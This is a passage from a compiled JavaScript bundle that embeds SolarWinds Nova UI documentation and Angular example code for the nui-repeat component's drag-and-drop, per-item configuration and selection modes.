<nui-repeat-reorder-simple-example></nui-repeat-reorder-simple-example>\n</nui-example-wrapper>\n\n<h2>Custom Drag Handle</h2>\n<p>\n    In order to customize the handle by which an element can be dragged, you can\n    specify the <code>dragHandleTemplateRef</code>.\n</p>\n<nui-message type="info" [allowDismiss]="false">\n    Providing the <code>dragHandleTemplateRef</code> template makes declaring\n    the <code>draggable</code> input property optional as it will automatically\n    be set to <code>true</code>.\n</nui-message>\n<nui-example-wrapper\n    filenamePrefix="repeat-drag-handle"\n    exampleTitle="Custom Drag Handle"\n>\n    <nui-repeat-drag-handle-example></nui-repeat-drag-handle-example>\n</nui-example-wrapper>\n\n<h2>Custom Drag Preview</h2>\n<p>\n    Once the user starts dragging an item, the preview DOM element is created as\n    the last child of the body. To have a custom CSS class for that element, you\n    can specify the <code>dragPreviewClass</code> input property. The default\n    value for this input is <code>"nui-dnd-preview"</code>.\n</p>\n<p>\n    In order to customize the drag preview template, you can specify the\n    <code>dragPreviewTemplateRef</code> input.\n</p>\n<nui-message type="info" [allowDismiss]="false">\n    Providing the <code>dragPreviewTemplateRef</code> template makes declaring\n    the <code>draggable</code> input property optional as it will automatically\n    be set to <code>true</code>.\n</nui-message>\n<nui-example-wrapper\n    filenamePrefix="repeat-drag-preview"\n    exampleTitle="Custom Drag Preview"\n>\n    <nui-repeat-drag-preview-example></nui-repeat-drag-preview-example>\n</nui-example-wrapper>\n\n<h2>Repeat Item Customization</h2>\n<p>\n    In order to customize the drag and drop behavior of any item in the repeat\n    component you can provide a configuration object containing callbacks for\n    the provided functionality via the <code>itemConfig</code> input.\n</p>\n<div>\n    Customization is available via the following properties of\n    <code>IRepeatItemConfig</code>:\n    <ul>\n        <li>\n            <code>{{ getItemConfigKey("isDraggable") }}</code> - Provide a\n            callback to decide if the item should be draggable\n        </li>\n        <li>\n            <code>{{ getItemConfigKey("isDisabled") }}</code> - Provide a\n            callback to decide if the item should be disabled\n        </li>\n        <li>\n            <code>{{ getItemConfigKey("trackBy") }}</code> - Provide a function\n            that defines how to track changes for items in the iterable.\n        </li>\n    </ul>\n</div>\n<nui-message type="warning" [allowDismiss]="false">\n    To be able to provide customized draggable behaviour per item, the main\n    <code>draggable</code> input must be true.\n</nui-message>\n<nui-example-wrapper\n    filenamePrefix="repeat-reorder-item-config-example"\n    exampleTitle="Drag & Drop - Per Item Customization"\n>\n    <nui-repeat-reorder-config-example></nui-repeat-reorder-config-example>\n</nui-example-wrapper>\n\n<h2>Multiple Selection Mode</h2>\n<p>\n    The <code>selectionMode</code>: <code>multi</code> repeats the items with a\n    checkbox component, and allows the user to select multiple items by clicking\n    the provided checkboxes or by clicking on the row itself. Unless\n    <code>preventRowClick</code> is set to <code>true</code>, then only\n    checkboxes will select the items.\n</p>\n<nui-example-wrapper\n    filenamePrefix="repeat-multi-selection"\n    exampleTitle="Multi selection repeat"\n>\n    <nui-repeat-multi-selection-example></nui-repeat-multi-selection-example>\n</nui-example-wrapper>\n\n<h2>Multiple Selection Mode with Disabled Items</h2>\n<p>\n    You can easily set the items being repeated to a disabled state. Make sure\n    the <code>itemsSource</code> you provide contains property\n    <code>disabled</code>: <code>true</code> for each disabled item.\n</p>\n<nui-example-wrapper\n    filenamePrefix="repeat-disabled-multi-selection"\n    exampleTitle="Disabled items in the repeat"\n>\n    <nui-repeat-disabled-multi-selection-example></nui-repeat-disabled-multi-selection-example>\n</nui-example-wrapper>\n\n<h2>Single Selection Mode with Item Highlight</h2>\n<p>\n    If you need to highlight clicked item without checkboxes and radio-button,\n    you can just use\n    <code>selectionMode</code>: <code>single</code>\n</p>\n<nui-example-wrapper\n    filenamePrefix="repeat-single-selection-mode"\n    exampleTitle="Highlight selected item"\n>\n    <nui-repeat-single-selection-mode-example></nui-repeat-single-selection-mode-example>\n</nui-example-wrapper>\n\n<h2>Single Selection Mode with Radio Buttons</h2>\n<p>\n    Use the <code>selectionMode</code>: <code>radio</code> mode to add radio\n    buttons for each item and allow to select one of them.\n</p>\n<nui-example-wrapper\n    filenamePrefix="repeat-radio-selection-mode"\n    exampleTitle="repeat with radio buttons"\n>\n    <nui-repeat-radio-selection-mode-example></nui-repeat-radio-selection-mode-example>\n</nui-example-wrapper>\n\n<nui-message type="warning" [allowDismiss]="false">\n    <strong>Pay Attention!</strong> The examples below may allow actions not\n    common for the front-end world. Please agree the use of the following\n    examples with your UI\\UX team.\n</nui-message>\n\n<h2>Non-Required Selection Mode with Radio Buttons</h2>\n<p>\n    This example shows how to make a list with radio buttons that can be either\n    checked on or checked off.\n</p>\n<nui-example-wrapper\n    filenamePrefix="repeat-radio-with-non-required-selection-mode"\n    exampleTitle="Radio with Non Required Selection Mode"\n>\n    <nui-repeat-radio-with-non-required-selection-mode-example></nui-repeat-radio-with-non-required-selection-mode-example>\n</nui-example-wrapper>\n\n<h2>Required Single Selection Mode</h2>\n<p>\n    This example shows the single selection mode list where at least one item is\n    always selected.\n</p>\n<nui-example-wrapper\n    filenamePrefix="repeat-single-with-required-selection-mode"\n    exampleTitle="Required Single Selection Mode"\n>\n    <nui-repeat-single-with-required-selection-mode-example></nui-repeat-single-with-required-selection-mode-example>\n</nui-example-wrapper>\n\n<nui-message [allowDismiss]="false" type="info">\n    Pagination and Virtual Scroll aren\'t natively part of the\n    <code>nui-repeat</code> component but the\n    <a href="../additional-documentation/schematics/list.html" target="_parent"\n        >List Schematic documentation</a\n    >\n    provides examples on how to use them.\n</nui-message>\n'},926:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\nimport { IRepeatItemConfig, RepeatComponent } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-repeat-example",\n    templateUrl: "./repeat-docs.example.component.html",\n})\nexport class RepeatExampleComponent {\n    getItemConfigKey(key: keyof IRepeatItemConfig): string {\n        return key;\n    }\n\n    getRepeatPropKey(key: keyof RepeatComponent): string {\n        return key;\n    }\n}\n'},78506:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-repeat\n    [itemsSource]="companies"\n    [dragHandleTemplateRef]="dragHandleTemplate"\n    [repeatItemTemplateRef]="repeatItemTemplate"\n    (itemsReordered)="onItemsReordered($event)"\n>\n</nui-repeat>\n\n\x3c!-- Content template for each item --\x3e\n<ng-template #repeatItemTemplate let-item="item">\n    {{ item }}\n</ng-template>\n\n\x3c!-- Drag handle template --\x3e\n<ng-template #dragHandleTemplate let-item="item">\n    <nui-icon icon="drag"></nui-icon>\n</ng-template>\n'},10806:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, ViewEncapsulation } from "@angular/core";\n\nimport { IItemsReorderedEvent } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-repeat-drag-handle-example",\n    templateUrl: "./repeat-drag-handle.example.component.html",\n    encapsulation: ViewEncapsulation.None,\n})\nexport class RepeatDragHandleExampleComponent {\n    public companies: string[] = ["Adobe", "IBM", "Dell", "Microsoft"];\n\n    public onItemsReordered(event: IItemsReorderedEvent<string>): void {\n        // update items according to the new order\n        this.companies = event.currentState;\n    }\n}\n'},78130:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-repeat\n    [itemsSource]="companies"\n    dragPreviewClass="nui-dnd-drag-preview"\n    [dragPreviewTemplateRef]="dragPreviewTemplate"\n    [repeatItemTemplateRef]="repeatItemTemplate"\n    (itemsReordered)="onItemsReordered($event)"\n>\n</nui-repeat>\n\n\x3c!-- Content template for each item --\x3e\n<ng-template #repeatItemTemplate let-item="item">\n    {{ item.name }}\n</ng-template>\n\n\x3c!-- Drag preview template --\x3e\n<ng-template #dragPreviewTemplate let-item="item">\n    <p>This is the preview for {{ item.name }}</p>\n    <img width="100" [src]="item.preview" [alt]="item.name" />\n</ng-template>\n'},55402:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='@import (reference) "nui-framework-variables";\n@import (reference) "mixins";\n\n.nui-dnd-drag-preview:extend(.nui-dnd-preview) {\n    color: @nui-color-text-default;\n    padding: @nui-space-md;\n    text-align: center;\n}\n'},78862:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, ViewEncapsulation } from "@angular/core";\n\nimport { IItemsReorderedEvent, IRepeatItem } from "@nova-ui/bits";\n\ninterface IRepeatCompanyItem extends IRepeatItem {\n    name: string;\n    disabled?: boolean;\n    preview?: string;\n}\n\n@Component({\n    selector: "nui-repeat-drag-preview-example",\n    templateUrl: "./repeat-drag-preview.example.component.html",\n    styleUrls: ["./repeat-drag-preview.example.component.less"],\n    encapsulation: ViewEncapsulation.None,\n})\nexport class RepeatDragPreviewExampleComponent {\n    public companies: IRepeatCompanyItem[] = [\n        {\n            name: "Adobe",\n            preview:\n                "https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Adobe_Systems_logo_and_wordmark.svg/524px-Adobe_Systems_logo_and_wordmark.svg.png",\n        },\n        {\n            name: "IBM",\n            preview:\n                "https://upload.wikimedia.org/wikipedia/commons/thumb/5/51/IBM_logo.svg/800px-IBM_logo.svg.png",\n        },\n        {\n            name: "Dell",\n            preview:\n                "https://upload.wikimedia.org/wikipedia/commons/thumb/4/48/Dell_Logo.svg/300px-Dell_Logo.svg.png",\n        },\n        {\n            name: "Microsoft",\n            preview:\n                "https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg",\n        },\n    ];\n\n    public onItemsReordered(\n        event: IItemsReorderedEvent<IRepeatCompanyItem>\n    ): void {\n        // update items according to the new order\n        this.companies = event.currentState;\n    }\n}\n'},64410:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<p>\n    <nui-switch [(value)]="draggable" i18n>Draggable</nui-switch>\n</p>\n<nui-repeat\n    (itemsReordered)="onItemsReordered($event)"\n    [itemsSource]="companies"\n    [repeatItemTemplateRef]="repeatItemTemplate"\n    [draggable]="draggable"\n>\n</nui-repeat>\n\n\x3c!-- Content template for each item --\x3e\n<ng-template #repeatItemTemplate let-item="item">\n    {{ item }}\n</ng-template>\n'},71814:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, ViewEncapsulation } from "@angular/core";\n\nimport { IItemsReorderedEvent } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-repeat-drag-simple-example",\n    templateUrl: "./repeat-drag-simple.example.component.html",\n    encapsulation: ViewEncapsulation.None,\n})\nexport class RepeatDragSimpleExampleComponent {\n    public companies: string[] = ["Adobe", "IBM", "Dell", "Microsoft"];\n\n    public draggable: boolean = true;\n\n    public onItemsReordered(event: IItemsReorderedEvent<string>): void {\n        // update items according to the new order\n        this.companies = event.currentState;\n    }\n}\n'},40462:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div>\n    <ul id="nui-repeat-item-example-repeat">\n        <nui-repeat-item\n            [clickable]="false"\n            [nowrap]="true"\n            [selected]="false"\n            *ngFor="let item of items"\n        >\n            {{ item }}\n        </nui-repeat-item>\n    </ul>\n</div>\n'},28074:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-repeat-item-example",\n    templateUrl: "./repeat-item.example.component.html",\n})\nexport class RepeatItemExampleComponent {\n    public items = [$localize`Item 1`, $localize`Item 2`, $localize`Item 3`];\n\n    constructor() {}\n}\n'},21452:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="example">\n    <p>\n        <span class="simple-label" i18n>Selection:</span>\n        <span id="nui-demo-multi-repeat-values">{{\n            selectedColors | json\n        }}</span>\n    </p>\n    <p>\n        <nui-switch\n            id="nui-demo-multi-repeat-switch"\n            [(value)]="preventRowClick"\n            >prevent row click</nui-switch\n        >\n    </p>\n    <nui-repeat\n        id="nui-demo-multi-repeat"\n        [itemsSource]="colors"\n        selectionMode="multi"\n        [preventRowClick]="preventRowClick"\n        [selection]="selectedColors"\n        (selectionChange)="selectedColors = $event"\n        [repeatItemTemplateRef]="repeatItemTemplate"\n    >\n        <div repeatHeaderTemplate>\n            <div class="template-header" i18n>repeat header from template</div>\n        </div>\n    </nui-repeat>\n</div>\n\n<ng-template #repeatItemTemplate let-item="item">\n    <div>{{ item.color }}</div>\n</ng-template>\n'},40732:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-repeat-multi-selection-example",\n    templateUrl: "./repeat-multi-selection.example.component.html",\n})\nexport class RepeatMultiSelectionExampleComponent {\n    public colors = [\n        { color: $localize`blue` },\n        { color: $localize`green` },\n        { color: $localize`yellow` },\n        { color: $localize`cyan` },\n        { color: $localize`magenta` },\n        { color: $localize`black` },\n    ];\n\n    public preventRowClick: boolean = false;\n\n    public selectedColors = [this.colors[2], this.colors[5]];\n}\n'},27322:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="example">\n    <p>\n        <span class="simple-label" i18n>Selection:</span>\n        <span id="nui-demo-radioselect-value">{{ selectedColors | json }}</span>\n    </p>\n    <p>\n        <nui-switch [(value)]="preventRowClick">prevent row click</nui-switch>\n    </p>\n    <nui-repeat\n        id="nui-demo-radio-repeat"\n        [itemsSource]="colors"\n        [selection]="selectedColors"\n        selectionMode="radio"\n        [preventRowClick]="preventRowClick"\n        [repeatItemTemplateRef]="repeatItemTemplate"\n        (selectionChange)="selectedColors = $event"\n    ></nui-repeat>\n</div>\n\n<ng-template #repeatItemTemplate let-item="item">\n    <div>{{ item.color }}</div>\n</ng-template>\n'},87654:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Input } from "@angular/core";\n\n@Component({\n    selector: "nui-repeat-radio-selection-mode-example",\n    templateUrl: "./repeat-radio-selection-mode.example.component.html",\n})\nexport class RepeatRadioSelectionModeExampleComponent {\n    @Input() public colors = [\n        { color: $localize`blue` },\n        { color: $localize`green` },\n        { color: $localize`yellow` },\n        { color: $localize`cyan` },\n        { color: $localize`magenta` },\n        { color: $localize`black` },\n    ];\n\n    public preventRowClick = false;\n\n    public selectedColors = [this.colors[1]];\n}\n'},71738:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="example">\n    <p>\n        <span i18n>Selection:</span>\n        <span id="nui-demo-radio-non-required-selection-repeat-value">{{\n            selectedColors | json\n        }}</span>\n    </p>\n    <p>\n        <nui-switch\n            id="nui-demo-radio-non-required-selection-repeat-switch"\n            #preventRowClick\n            >prevent row click</nui-switch\n        >\n    </p>\n    <nui-repeat\n        id="nui-demo-radio-non-required-selection-repeat"\n        [itemsSource]="colors"\n        [selection]="selectedColors"\n        [selectionMode]="selectedMode"\n        [preventRowClick]="preventRowClick.value"\n        (selectionChange)="selectedColors = $event"\n        [repeatItemTemplateRef]="repeatItemTemplate"\n    ></nui-repeat>\n</div>\n\n<ng-template #repeatItemTemplate let-item="item">\n    <div>{{ item.color }}</div>\n</ng-template>\n'},83142:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-repeat-radio-with-non-required-selection-mode-example",\n    templateUrl:\n        "./repeat-radio-with-non-required-selection-mode.example.component.html",\n})\nexport class RepeatRadioWithNonRequiredSelectionModeExampleComponent {\n    public colors = [\n        { color: $localize`blue`, disabled: true },\n        { color: $localize`green` },\n        { color: $localize`yellow`, disabled: true },\n        { color: $localize`cyan` },\n        { color: $localize`magenta` },\n        { color: $localize`black` },\n    ];\n\n    public selectedColors = [this.colors[1]];\n    public selectedMode: string = "radioWithNonRequiredSelection";\n\n    constructor() {}\n}\n'},4011:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="d-flex">\n    <nui-switch class="p-2" [(value)]="draggable" i18n>Dragging</nui-switch>\n    <nui-switch class="p-2" [(value)]="reorderable" i18n>Reordering</nui-switch>\n</div>\n<nui-repeat\n    (itemsReordered)="onItemsReordered($event)"\n    [itemsSource]="colors"\n    [repeatItemTemplateRef]="repeatItemTemplate"\n    [itemConfig]="itemConfig"\n    [(draggable)]="draggable"\n    [(reorderable)]="reorderable"\n>\n</nui-repeat>\n\n\x3c!-- Content template for each item --\x3e\n<ng-template #repeatItemTemplate let-item="item">\n    <div [class.nui-text-secondary--disabled]="itemConfig.isDisabled(item)">\n        {{ item.color }} - {{ item.description }}\n    </div>\n</ng-template>\n'},81267:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, ViewEncapsulation } from "@angular/core";\n\nimport {\n    IItemsReorderedEvent,\n    IRepeatItem,\n    IRepeatItemConfig,\n} from "@nova-ui/bits";\n\ninterface IRepeatColorItem extends IRepeatItem {\n    color: string;\n    description: string;\n}\n\n@Component({\n    selector: "nui-repeat-reorder-config-example",\n    templateUrl: "./repeat-reorder-item-config-example.component.html",\n    encapsulation: ViewEncapsulation.None,\n})\nexport class RepeatReorderItemConfigExampleComponent {\n    public colors: IRepeatColorItem[] = [\n        { color: $localize`blue`, description: "Should be draggable" },\n        { color: $localize`green`, description: "Disabled with callback" },\n        {\n            color: $localize`yellow`,\n            disabled: true,\n            description: "Disabled with property",\n        },\n        {\n            color: $localize`orange`,\n            disabled: false,\n            description: "Enabled with property",\n        },\n    ];\n\n    public draggable: boolean = true;\n    public reorderable: boolean = true;\n\n    public itemConfig: IRepeatItemConfig<IRepeatColorItem> = {\n        isDraggable: (item: IRepeatColorItem): boolean =>\n            item.color === $localize`blue` || item.color === $localize`orange`,\n        // Note: Using both cases to check if item is disabled, normally we should use only one method\n        isDisabled: (item: IRepeatColorItem): boolean =>\n            item.color === $localize`green` || item.disabled,\n        trackBy: (index: number, item: IRepeatColorItem): string => item.color,\n    };\n\n    public onItemsReordered(\n        event: IItemsReorderedEvent<IRepeatColorItem>\n    ): void {\n        this.colors = event.currentState;\n    }\n}\n'},84133:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="d-flex">\n    <nui-switch class="p-2" [(value)]="draggable" i18n>Draggable</nui-switch>\n    <nui-switch class="p-2" [(value)]="reorderable" i18n\n        >Reorderable</nui-switch\n    >\n</div>\n<nui-repeat\n    (itemsReordered)="onItemsReordered($event)"\n    [itemsSource]="companies"\n    [repeatItemTemplateRef]="repeatItemTemplate"\n    [(draggable)]="draggable"\n    [(reorderable)]="reorderable"\n>\n</nui-repeat>\n<div class="d-flex m-2">\n    <div><strong i18n>Event data</strong>:</div>\n    <div class="ml-1">\n        {{ droppedEventData ? (droppedEventData | json) : "N/A" }}\n    </div>\n</div>\n\n\x3c!-- Content template for each item --\x3e\n<ng-template #repeatItemTemplate let-item="item">\n    {{ item }}\n</ng-template>\n'},50017:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF 